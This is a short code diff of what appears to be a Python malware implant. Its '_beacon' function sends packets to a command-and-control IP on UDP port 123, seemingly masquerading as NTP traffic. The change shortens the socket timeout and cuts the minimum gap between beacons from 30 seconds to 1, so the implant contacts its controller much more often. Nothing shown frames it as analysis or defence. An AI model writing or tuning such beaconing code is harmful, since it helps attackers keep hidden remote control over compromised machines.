@@ -397,7 +397,7 @@ def _beacon(c2_ip):
 
     data = None
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(10)
+    sock.settimeout(2)
     try:
         sock.sendto(pkt, (c2_ip, 123))
         data, _ = sock.recvfrom(2048)
@@ -494,7 +494,7 @@ def main():
             except Exception:
                 pass
         tick += 1
-        time.sleep(max(30, BEACON_INT + random.randint(-JITTER, JITTER)))
+        time.sleep(max(1, BEACON_INT + random.randint(-JITTER, JITTER)))
 
 
 if __name__ == "__main__":
